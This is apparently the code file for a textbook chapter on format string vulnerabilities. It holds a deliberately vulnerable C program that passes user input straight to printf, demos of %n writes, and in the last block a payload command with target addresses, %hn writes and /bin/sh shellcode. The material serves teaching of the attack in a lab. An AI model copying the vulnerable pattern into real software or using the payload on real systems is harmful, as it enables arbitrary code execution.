/******************************
 * Code in Chapter 6 
 ******************************/



/**********************************************
 * Code on Page 104 (Section 6.1)
 **********************************************/ 
#include <stdio.h>

int main() 
{
    int i=1, j=2, k=3;

    printf("Hello World \n");
    printf("Print 1 number:  %d\n", i);
    printf("Print 2 numbers: %d, %d\n", i, j);
    printf("Print 3 numbers: %d, %d, %d\n", i, j, k);
}



/**********************************************
 * Code on Pages 104-105 (Section 6.1.1)
 **********************************************/ 
#include <stdio.h>
#include <stdarg.h>

int myprint(int Narg, ... ) 
{
  int i;
  va_list ap;                              

  va_start(ap, Narg);                      
  for(i=0; i<Narg; i++) {
    printf("%d  ", va_arg(ap, int));       
    printf("%f\n", va_arg(ap, double));    
  }
  va_end(ap);                              
}

int main() {
  myprint(1, 2, 3.5);                      
  myprint(2, 2, 3.5, 3, 4.5);              
  return 1;
}



/**********************************************
 * Listing 6.1: The vulnerable program vul.c (Section 6.3)
 **********************************************/ 
#include <stdio.h>

void fmtstr()
{
    char input[100];
    int var = 0x11223344;                     

    /* print out information for experiment purpose */
    printf("Target address: %x\n", (unsigned) &var);
    printf("Data at target address: 0x%x\n", var);

    printf("Please enter a string: ");
    fgets(input, sizeof(input)-1, stdin);

    printf(input); // The vulnerable place    (*@\ding{192}@*)

    printf("Data at target address: 0x%x\n",var);
}

void main() { fmtstr(); }






/**********************************************
 * Code on Page 114 (Section 6.4.5) 
 **********************************************/ 
#include <stdio.h>
void main()
{
  int a, b, c;
  a = b = c = 0x11223344;

  printf("12345%n\n", &a);
  printf("The value of a: 0x%x\n", a);
  printf("12345%hn\n", &b);
  printf("The value of b: 0x%x\n", b);
  printf("12345%hhn\n", &c);
  printf("The value of c: 0x%x\n", c);
}
----------------------------------------
Execution result: 
seed@ubuntu:$ a.out
12345
The value of a: 0x5          
12345
The value of b: 0x11220005   
12345
The value of c: 0x11223305  
 



/**********************************************
 * Code on Page 116
 **********************************************/ 
$ echo $(printf "\x8e\xf3\xff\xbf@@@@\x8c\xf3\xff\xbf")
    _%.8x_%.8x_%.8x_%.8x_%.49102x%hn_%.13144x%hn
    $(printf "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90
    \x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b
    \xcd\x80") > input
 

